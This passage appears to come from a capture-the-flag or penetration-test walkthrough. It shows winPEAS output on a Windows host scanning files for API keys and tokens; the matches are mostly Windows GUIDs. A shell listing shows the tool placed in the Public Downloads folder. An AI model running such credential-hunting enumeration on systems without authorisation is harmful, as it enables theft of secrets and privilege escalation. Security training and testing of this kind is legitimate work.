C:\Users\All Users\Microsoft\UEV\InboxTemplates\EaseOfAccessSettings2013.xml: oegankelijkheidsinstelli

          ͹ Found APIs-Mattermost Access Token Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\EaseOfAccessSettings2013.xml: oegankelijkheidsinstelling

          ͹ Found APIs-Plaid Client ID Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\EaseOfAccessSettings2013.xml: oegankelijkheidsinstelli

          ͹ Found APIs-Plaid Secret key Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml: roaminglegitimationsoplysninge

          ͹ Found APIs-SumoLogic Access ID Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win32.xml: synchronizatio
C:\Users\All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win32.xml: ynchronization
C:\Users\All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win32.xml: ynchronization

          ͹ Found APIs-Travis CI Access Token Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\EaseOfAccessSettings2013.xml: oegankelijkheidsinstel

          ͹ Found APIs-Adafruit API Key Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b

          ͹ Found APIs-Hubspot API Key Regexes
C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\KeyHolder\61afd6a2-d7c3-8d25-36c2-0c2c47e3aca8.xml: "6b594c27-b3ee-45ff-812e-686be66532ce"

          ͹ Found APIs-Kucoin Secret Key Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee

          ͹ Found APIs-MojoAuth API Key Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee

          ͹ Found APIs-Nytimes Access Token Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b

          ͹ Found APIs-ORB Intelligence Access Key Regexes
C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\KeyHolder\61afd6a2-d7c3-8d25-36c2-0c2c47e3aca8.xml: "6b594c27-b3ee-45ff-812e-686be66532ce"

          ͹ Found APIs-Sendbird Access ID Regexes
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee

          ͹ Found APIs-URLScan API Key Regexes
C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\KeyHolder\61afd6a2-d7c3-8d25-36c2-0c2c47e3aca8.xml: "6b594c27-b3ee-45ff-812e-686be66532ce"

          ͹ Found APIs-Gitter Access Token Regexes
C:\Users\Default\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml: c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5

          ͹ Found APIs-Launchdarkly Access Token Regexes
C:\Users\Default\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml: c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5

          ͹ Found APIs-Netlify Access Token Regexes
C:\Users\Default\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml: c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2tx

          ͹ Found APIs-Okta Access Token Regexes
C:\Users\Default\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml: c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1

          ͹ Found APIs-RapidAPI Access Token Regexes
C:\Users\Default\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml: c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy

          ͹ Found APIs-Vault Token Regexes
C:\Users\All Users\VsTelemetry\Default\Default.manifest.json: s.objectexplorernonfataler

          ͹ Found Misc-Config Secrets Regexes
C:\Users\All Users\Microsoft\UEV\Scripts\RegisterInboxTemplates.ps1: $env:

          ͹ Found Misc-IPs Regexes
C:\Users\All Users\Microsoft\Windows\OneSettings\CTAC.json: 1.0.0.0

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

PS C:\Users\Public\Downloads> ls
ls


    Directory: C:\Users\Public\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/10/2025   7:53 AM        2387456 winpeas.exe      
```